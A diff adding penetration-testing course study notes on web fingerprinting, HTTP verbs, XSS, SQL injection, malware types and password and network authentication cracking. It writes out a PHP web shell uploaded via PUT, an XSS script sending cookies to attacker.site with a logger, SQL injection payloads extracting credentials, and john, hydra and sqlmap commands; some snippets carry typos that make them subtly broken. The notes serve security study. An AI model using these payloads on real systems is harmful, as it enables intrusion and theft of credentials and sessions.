@@ -2018,17 +2018,167 @@ Web applications use different technologies and programming paradigms compared t
 
 #### (2/16) Web Server Fingerprinting - Study Guide
 
+- Webapps often make up the vast majority of the internet-facing surface
+- It can be done manually and by using automatic tools
+- Fingerprinting a web server means:
+  - Web Server Service: IIS, Apache, nginx
+  - Version
+  - OS hosting the server
 
+# Fingerprinting with Netcat
 
+- Manually send requests to the server
+- Banner grabbing:
 
+```bash
+nc <target_address> 80
+HEAD / HTTP/1.0
+```
 
+Output will be different for a Debian Linux Box, Apache Server running on Red Hat, MS IIS running on a MS Windows.
+- Write the request in uppercase always
+- Netcat does not notify you after the connection to the server
+- You must write your request after running the command (or use `-v`)
+- Netcat does not perform any kind of encryption, so you cannot use it for HTTPS
+
+##### Fingerprinting with OpenSSL
+
+- `openssl` is a CLI to manually use various features of the OpenSSL SSL/TLS toolkit
+- You can use it to establish a connection to an HTTPS service then send the usual HEAD HTTP verb:
+
+```bash
+open s_client -connect target.site:443
+HEAD / HTTP/1.0
+```
+
+##### Fingerprinting with Httprint
+
+- `httprint` is a web server fingerprinting tool that uses a signature-based technique to identify webservers
+
+```bash
+httpprint -P0 -h <target hosts> -s <signature file>
+# -PO to avoid pinging the host
+# -h <target hosts> tells the tool to fingerprint a list of hosts, it is advised to use the IP address of the hosts you want to test
+# -s set the signature file to use
+```
 
 #### (3/16) HTTP Verbs - Study Guide
-#### (4/16) Netcat
+
+- REST APIs are specific type of webapp that relies strongly on almost all HTTP verbs
+- In REST APIs is common to use PUT for saving data, and not for saving files
+- If you confirm a PUT or DELETE during an engagement, you should confirm its exact impact twice
+
+```
+# GET is used to request a resource
+GET /page.php HTTP/1.1
+Host: www.example.site
+
+# You can also pass arguments to the web application
+GET /page.php?course=PTS HTTP/1.1
+Host: www.example.site
+
+# POST is used to submit HTML form data
+# POST parameters must be in the message body
+POST /login.php HTTP/1.1
+Host: www.example.site
+
+username=john&password=mypass
+
+# HEAD is very similar to GET, as it asks just headers of the response instead of the response body
+HEAD / HTTP/1.1
+Host: www.example.site
+
+# PUT is used to upload a file to a server
+PUT /path/to/destination HTTP/1.1
+Host: www.example.site
+
+<PUT DATA>
+
+# DELETE is used to remove a file from the server
+# Must be configured wisely as it might lead to DoS and data loss
+DELETE /path/to/destination HTTP/1.1
+Host: www.example.site
+
+# OPTIONS is used to query the web server for enabled HTTP Verbs
+OPTIONS / HTTP/1.1
+Host: www.example.site
+```
+
+##### Exploiting Misconfigured HTTP verbs
+
+- 1st you enumerate verbs with an OPTIONS message in `nc`
+- To exploit the DELETE verb, you just have to specify the file you want to delete from the server
+- Exploiting PUT is more complex, because you have to know the size of the file you want to upload on the server, you can measure with `wc -m file` to count how long, in bytes, a payload is
+
+```bash
+nc victim.site 80
+PUT /payload.php HTTP/1.0
+Content-type: text/html
+Content length: 20
+
+<?php phpinfo(); ?>
+```
+
+##### PHP Shell
+
+```php
+if (isset($_GET['cmd'])) {
+  $cmd = $_GET['cmd'];
+  echo '<pre>';
+  $result = shell_exec($cmd);
+  echo $result;
+  echo '</pre>';
+}
+```
+
+Then you could do with `nc`:
+
+```bash
+nc victim.site 80
+PUT /payload.php HTTP/1.0
+Content-type: text/html
+Content-length: 136
+
+if (isset($_GET['cmd'])) {
+  $cmd = $_GET['cmd'];
+  echo '<pre>';
+  $result = shell_exec($cmd);
+  echo $result;
+  echo '</pre>';
+}
+```
+
+- Misconfigured HTTP verbs are becoming rare in web servers
+- You can still find a lot of misconfigured HTTP methods in embedded devices, IP cameras, digital video recorders and other smart devices
+
+#### <span style="color: red">VIDEO - (4/16) Netcat</span>
+
 #### (5/16) Directories and Files Enumeration - Study Guide
-#### (6/16) Dirbuster
-#### (7/16) Dirb
-#### (8/16) Dirbuster
+
+> Ability to:
+> - Find and utilize testing features
+> - Exploit information saved in backup or old files
+> - Find hidden resources
+
+Enumeration helps you find those "hidden" resources that often contain:
+- New and untested features
+- Backup files
+- Testing information
+- Developer's notes
+
+Two ways of enumerating resources:
+- Pure brute-force
+- Dictionary attacks
+
+Tool:
+- OWASP Dirbuster
+  - Java application that can perform web resources enumeration
+  - You can choose if you want to perform a pure brute-force or a dictionary-based brute-force
+  - It's Linux alternative: `dirb`
+
+#### <span style="color:red">VIDEO - (6/16) Dirbuster</span>
+#### <span style="color:red">VIDEO - (7/16) Dirb</span>
+#### <span style="color:red">LAB - (8/16) Dirbuster</span>
 #### (9/16) Google Hacking - Study Guide
 
 > Goal #1: perform information gathering without contacting your targets, ability to find hidden resources
@@ -2044,33 +2194,434 @@ inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent director
 - [Exploit DB](https://www.exploit-db.com/google-hacking-database)
 
 #### (10/16) Cross Site Scripting - Study Guide
-#### (11/16) XSS
-#### (12/16) Cross site scripting
+
+> Ability to:
+> - Attack webapps' users
+> - Control webapps' content
+> - Gain advanced web attacks skills
+
+- XSS is a vulnerability that lets an attacker control some of the content of a webapp
+- XSS vulnerabilities happen when a webapp uses unfiltered user input to build the output content displayed to its end users, letting an attacker control the output HTML and JS code, targeting the app's users (admin is included)
+- XSS involves injecting malicious code into the output of a webpage, this malicious code is the rendered (or executed) by the browser of the visiting users
+The attacker can target the webapp's users, and:
+  - Modify the content of the site at run-time
+  - Inject malicious contents
+  - Steal the cookies, thus the session of a user
+  - Perform actions on the web application as if it was a legitimate user
+
+ User input is any parameter coming from the clientside of the webapp, as:
+  - Request headers
+  - Cookies
+  - Form inputs
+  - POST parameters
+  - GET paramaters
+
+ Actors of a XSS attack:
+ - Vulnerable website
+   - inputs should always be validated server side
+   - never ever trust user input
+ - User/visitor (victim)
+   - Code executed/rendered by the browser of the visiting users
+   - XSS has low priority for developers, which shouldn't be
+   - it can be really hard for a victim to realiza that an attack is in progress
+ - The pentester, launching attacks:
+   - Making their browsers load malicous content
+   - Performing operations on their behalf, like buying a product or changing a password
+   - Stealing the session cookies, thus being able to impersonate them on the vulnerable site
+   - If stolen user is an admin, the entire website can be impersonated
+
+- Reflection Point: When a search parameter is submitted thorugh a form and gets displayed on the output
+- After finding a reflection point, you have to underswtand if you can inject HTML code and see if it somehow gets to the output of the page
+- Test XSS: `<script>alert('XSS')</script>`
+
+XSS Types:
+- Reflected
+  - When the malicious payload is carried inside the request that browser of the victim sends to the vulnerable website
+  - When users click on the link , the users trigger the attack
+  - `http://victim.site/search.php?find=<payload>`
+  - Called 'reflected' because an input field of the HTTP request sent by the browser gets immediately reflected to the output page
+  - Google Chrome has a reflected XSS filter built in to avoid this attack, but only trivial ones
+- Persistent
+  - Occur when the payload is sent to the vulnerable web server and then stored.
+  - When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload
+  - The malicious code gets delivered each and every time a web browser hits the "injected" web page
+  - A single attack can exploit multiple web applications
+  - The most common vector for persistent attacks are HTML forms that submit conetnt to the web server and then display that content back to the users
+  - Element such as comments, user profiles, and forum posts are potential vector for XSS attacks
+- DOM Based
+
+Cookie Stealing via XSS
+- When `HttpOnly` flag is disabled, cookies can be stolen
+- `<script>alert(document.cookie)</script>`
+- With the following code, you can send cookies content to an attacker-controlled site:
+
+```javascript
+<script>
+  var i = new Image();
+  i.src = "http://attacker.site/log.php?q="+document.cookie;
+</script>
+```
+
+```php
+<?php
+$filename="/tmp/log.txt";
+$fp=fopen($filename, 'a');
+$cookie=$_GET['q'];
+fwrite($fp, $cookie);
+flocse($fp);
+?>
+```
+
+- [OWASP-XSS](https://owasp.org/www-community/attacks/xss/)
+
+#### <span style="color:red">VIDEO - (11/16) XSS</span>
+#### <span style="color:red">LAB (12/16) Cross site scripting</span>
+
 #### (13/16) SQL Injections - Study Guide
-#### (14/16) SQL Injection
-#### (15/16) Sqlmap
-#### (16/16) SQL Injection
+
+- They allow an unathorized user to take control over SQL statements used by a web application.
+- This kind of attack has a huge impact on a web site because getting contorl over a backend database means controlling:
+  - User's credentials
+  - Data of the web application
+  - Credit Card numbers
+  - Shopping transactions
+
+##### SQL basics
+
+An application performs this tasks:
+- Connect to the DB
+- Submit the query to the database
+- Retrieve the results
+
+```sql
+-- SELECT <columns list> FROM <table> WHERE <conditions>;
+SELECT name, description FROM products WHERE id=9;
+
+-- UNION command performs a union between
+<SELECT statement> UNION <other SELECT statement>;
+```
+
+##### Vulnerable Dynamic Queries
+
+This dynamic query expects $id values as a string:
+
+```sql
+SELECT Name, Description FROM Products WHERE ID='$id'
+```
+
+But what if an attacker crafts a $id value which can change the query to something like: ` OR 'a'='a`
+
+Then the query becomes:
+```sql
+SELECT Name, Description FORM Products WHERE UD='' OR 'a'='a';
+```
+
+Which tells the database to select the items by checking two conditions wich is always true.
+
+An attacker could also exploit the UNION command by supplying the following:
+
+```sql
+' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
+```
+
+Thus it changes the original query to:
+
+```sql
+SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
+```
+
+To find SQL injections, we need to check any user input (every input must be tested to conduct a professional pentest):
+- GET parameters
+- POST parameters
+- HTTP Headers
+  - User-Agent
+  - Cookie
+  - Accept
+
+Tests can be:
+- String terminators: `' and ''`
+- SQL commands: `SELECT`, `UNION` and others
+- SQL comments: `#` or `--`
+
+##### Boolean Based SQLi
+
+Once penentration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions:
+- Is the first letter of the username 'a'?
+- Does this database contain three tables?
+- ...
+
+We can use two MySQL functions: `user()` and `substring()`
+- `user()` returns the name of the user currently using the database:
+
+```sql
+select user();
+```
+
+- `substring()` returns a substring of the given argument. It takes 3 parameters:
+  - the input string
+  - the position of the substring
+  - its length
+
+```sql
+select substring('elarnsecurity', 2, 1)
+```
+
+We can use both together:
+```sql
+substring(user(), 1, 1);
+--- it might return 'r' for 'root' user
+
+substring(user(), 1, 1) = 'r'
+-- if it returns 1 -> True; 0 -> False
+```
+
+Combining those features, we can iterate over the letters of the username by using payloads as:
+
+```sql
+' or substr(user(), 1, 1) =='a
+' or substr(user(), 1, 1) =='b
+```
+
+when we find the first letter then we can move to the second and so on in order to guess the entire username.
+
+##### UNION Based SQL Injections
+
+- Many times some of the results of a query are directly displayed on the output page
+- This feature can be exploited using the UNION SQL command
+- If the payload makes the result of the original query empty, then we can have the results of another, attacker controlled, query shown on the page
+- The following payload fornces the web application to display the result of the `user()` function on the output page
+- The comment at the end of the line prevents the follwing part of the original query from being parsed by the database, comments the rest from the original query
+- The comment also contains a third dash because most of the browsers automaticall remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment
+
+```sql
+SELECT description FROM items where id='' UNION SELECT user(); -- -';
+```
+
+- To exploit a SQL injection you first need to know how many fields the vulnerable query selects, you do this by trial and error
+- We know there's an injection by `' UNION sELECT null; -- -`, this should display:
+
+```
+Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean given in /var/www/view.php on line 32
+```
+
+- We can try with two fields: `' UNION SELECT null null; -- -` and three even to confirm that the original query only has two fields
+- Once we know how many fields are in the query it's time to test which fields are part of the output page
+- You can do that by injecting some known values and checking thee results in the output page, as in: `' UNION SELECT 'elsid1', 'elsid2'; -- -`
+- Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`
+- Not only `SELECT` queries are vulnerable
+
+##### SQLMap
+
+- Can detect and exploit SQL injections
+- Needs to know the vulnerable URL and the parameter to test for a SQLi
+
+```bash
+sqlmap -u <URL> -p <inejction parameter> [options]
+sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
+# technique=U --> UNION based SQL injection technique
+sqlmap -u <url> --data=<POST string> -p id [options]
+# You can copy the POST string from a request intercepted in Burp Suite
+```
+
+#### <span style="color:red">VIDEO - (14/16) SQL Injection</span>
+#### <span style="color:red">VIDEO - (15/16) Sqlmap</span>
+#### <span style="color:red">(16/16) SQL Injection</span>
 
 ### System Attacks (6 items)
 
 #### (1/6) Malware - Study Guide
-#### (2/6) Backdoor
+
+Any software used to misuse computer sistems with the intent to cause a DoS, spy on users activity, get aunauthorized control over one or more computer systems, etc.
+
+- **Virus**: small piece of code that spreads from computer to computer without any direct action or authorization by the owners of the infected machines, normally copying themselves to special sections of the HDD or inside legitimate programs or documents, running everytime an infected program or file is opened
+- **Trojan Horse**: comes embedded in seemingly harmless file, being _backdoors_ the most common
+- **Backdoors**: two components, server and client
+  - Server runs on the victim machine listening on the network in order to accept connections
+  - Client runs on the attacker machine
+  - `Netbus` or `SubSeven` are very famous
+  - If the backdoor server sits behind a firewall, the easiest way to achive a connection is using a **Connect-back Backdoor** or **Reverse Backdoor**
+  - A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine
+- **Rootkit**: designed to hide itself from users and antivirus programs in order to subvert the OS functioning, maintaining privileged access to the victim without being noticed
+- **Bootkit**: rootkits which circumvent OS protection mechanisms by executing during the bootstrap phase
+- **Adware**: annoying software that shows ads to computer users
+- **Spyware**: collects info about user's activity (OS, visited websites, passwords)
+- **Greyware**: either spyware, adware or both
+- **Dialer**: tries to dial numbers on dial-up connections in order to collect money from the victim's phone bill, nowadays targeting smartphones
+- **Keylogger**: special software that records every keystroke on the remote victim machine, winidow names and sends logs to a server controlled by the attacker
+  - **Hardware keyloggers**
+  - **Rootkit keyloggers**: stealthy and more invisible to the victim user than software keyloggers, hijacks the OS APIs to record keystrokes, intercepting the interrupt tables from the OS
+- **Bots**: small pieces of software that get installed on millions of machines to perform DoS, and remotelly commanded by a C&C server
+- **Ransomware**: encrypts a computer or smartphone with a secret key and aks its victim for a ransom
+- **Data Stealing Malware**: most of the time targeted to a specific company and tailored to work on the target environment
+- **Worms**: spread over the network by exploiting OS and SW vulnerabilities, exploiting credentials or misconfigurations to attack a service or a machine, usually worms are part of other software and they offer an entry point into the target system
+
+#### <span style="color:red">VIDEO - (2/6) Backdoor</span>
+
 #### (3/6) Password Attacks - Study Guide
-#### (4/6) John the Ripper
-#### (5/6) Hashcat
+
+- Normally stored in an encrypted form, preventing a malicious local user from getting to know user's passwords, using a _one-way encryption algorithm_, using a cryptographic hashing function
+- _Password Cracking_ is the process of recovering clear-text passwords starting from their hash, where the attacker tries to guess the password
+- There are two main strategies:
+  - **Brute force attacks**
+    - You try them all!
+    - **Generate** and test all the possible valid passwords
+    - Given enough time, a brute force attack is always successful
+    - Only used when other attack vectors fail
+    - Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
+    - **John The Ripper**: can mount both brute force and dictionary-based attacks against a password database (see: `john --list=formats`)
+      - Fast because of the high use of parallelization, crack strategies
+      - `/etc/passwd`: contains info about user acccounts
+      - `/etc/shadow`: contains info about the actual password hashes
+      - `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
+      - `john -incremental -users:<users list> <file to crack>`
+      - `john -incremental -users:victim crackme`
+      - To display the passwords recovered by `john`, use: `john --show <file>`
+  - **Dictionary attacks**
+    - Common passwords
+    - Faster than pure brute fornce attacks
+    - Poorly chosen or default passwords are more exposed to dictionary cracking
+    - `john -wordlist=<custom wordlist file> <file to crack>`
+    - Install password dictionaries: `apt-get install seclists`
+      - You'll find them in `/usr/share/seclists/Passwords`
+  - **Mangling words**
+    - Variations on dictionary words
+    - `john -wordlist=<custom wordlist file> <file to crack> -rules <file to crack>`
+  - **Rainbow Tables**
+    - Offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack
+    - A rainbow table contains links between the results of a run of one hashing function and another
+    - Rainbow tables are BIG in file size, but reduces a cracking session from days to seconds
+    - Great choice to crack simple and complex short passwords
+    - `Ophcrack` rainbow cracking for Windows authentication passwords (can run on Linux too)
+
+#### <span style="color:red">VIDEO - (4/6) John the Ripper</span>
+#### <span style="color:red">VIDEO - (5/6) Hashcat</span>
+
 #### (6/6) Buffer Overflow Attacks - Study Guide
+
+A BoF attack can lead to:
+- An app or OS crash (DoS)
+- Privilege escalation
+- Remote code execution
+- Security features bypass
+
+A buffer is an area in the RAM reserved for temporary data storage:
+- User input
+- Parts of a video file
+- Server banners received by a client application
+- etc.
+- Buffers have a finite size, therefore: if an app develooper does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code
+
+##### Stack
+
+- A stack is a data structure used to store data.
+- Two operation for LIFO stacks: `pop` & `push`
+- Space on the stack can be allocated from app's code
+- An overflow happens when an attacker overwrites on a reserved space, so overwriting a function return address means getting control over the app
+- If an attacker manages to overflow a local variable from the app, the attacker would be able to overwrite the _Base Pointer_ and then get a _Return Address_
+- If the attacker overwrites the _Return Address_ with the right value, they are able to control the execution flow of the program
+- This technique can be exploited by writing custom tools and applications or by using hacking tools as Metasploit
+
+Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and OS works and some exotic programming skills
 
 ### Network Attacks (17 items)
 
 #### (1/17) Authentication Cracking - Study Guide
-#### (2/17) Hydra: Authentication Cracking
-#### (3/17) Bruteforce and Password cracking
+
+A similar approach to cracking a password can be used for every service requiring network authentication as: ssh, telnet, remote desktop, HTTP authentication, etc.
+
+##### Brute Force vs Dictionary Attacks
+
+- Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe
+  - Network latency
+  - Delays on the attacked service
+  - Processing time on the attacked server
+- Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and defualt usernames and passwords
+
+##### Hydra
+
+- Fast, parallelized, network authentication cracker that supports different protocols:
+  - Cisco auth
+  - FTP
+  - HTTP
+  - IMAP
+  - RDP
+  - SMB
+  - SSH
+  - Telnet
+
+To get detailed information about a module:
+```bash
+hydra -U rdp
+```
+
+To launch a dictionary attack against a service:
+
+```bash
+hydra -L users.txt -P pass.txt <service://server> <options>
+
+# For instance
+hydra -L users.txt -P pass.txt telnet://target.server
+
+# Attack session against a password protected web resource
+hydra -L users.txt -P pass.txt http-get://localhost/
+```
+
+#### <span style="color:red">VIDEO - (2/17) Hydra: Authentication Cracking</span>
+#### <span style="color:red">LAB - (3/17) Bruteforce and Password cracking</span>
+
 #### (4/17) Windows Shares - Study Guide
+
+> Ability to:
+> - Enumerate network resources
+> - Attack Windows sessions
+> - Obtain unathorized access to Windows resources
+
+Windows' filesharing can be exploited.
+- NetBIOS (Network Basic Input Output System)
+  - Allows servers and clients to view network shares on a local area network
+  - It can supply some of the following information while querying computers:
+    - Hostname
+    - NetBIOS name
+    - Domain
+    - Network shares
+  - NetBIOS sits between the application layer and the IP layer (NetBIOS over TCP/IP)
+    - UDP is used to perform name resolution and to carry other one-to-many datagram-based communications (like send small messages to the rest of the other hosts)
+    - TCP is used for heavy traffic, as copying files over the network, using _NetBIOS sessions_
+  - MS Windows browses the network using NetBIOS to:
+    - Datagrams to list the sahres and the machines
+    - Names to find workgroups
+    - Sessions to transmit data to and from a Windows share
+
+##### Shares
+
+An authorized user can access shares by using **UNC Paths (Universal Naming Concetion Paths**:
+
+```
+\\ServerName\ShareName\file.nat
+
+\\ComputerName\C$ # access to a volume (C$, D$, E$)
+
+\\ComputerName\admin$ # points to the windows installation directory
+
+\\ComputerName\ipc$  # used for inter-process communication, cannot be browsed via Explorer
+```
+
+Badly configured shares exploitation can lead to:
+- Information disclosure
+- Unauthorized file access
+- Information leakage used to mount a targeted attack
+
 #### (5/17) Null Sessions - Study Guide
-#### (6/17) Null Session
-#### (7/17) Null Session
+
+
+
+#### <span style="color:red">VIDEO - (6/17) Null Session</span>
+#### <span style="color:red">LAB - (7/17) Null Session</span>
+
 #### (8/17) ARP Poisoning - Study Guide
-#### (9/17) ARP Spoofing
+
+####  <span style="color:red">VIDEO - (9/17) ARP Spoofing</span>
+
 #### (10/17) ARP Poisoning
 #### (11/17) Metasploit - Study Guide
 #### (12/17) Metasploit
@@ -2112,7 +2663,7 @@ inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent director
 
 Defense:
 
-- Incident Response team memeber
+- Incident Response team member
 - CCERT analyst
 - Malware analyst
 - Threat hunter
@@ -2122,7 +2673,7 @@ Defense:
 ## References
 
 - https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/
-
+- XSS Attacks: [hack.me](hack.me)
 
 <!--
 To do:
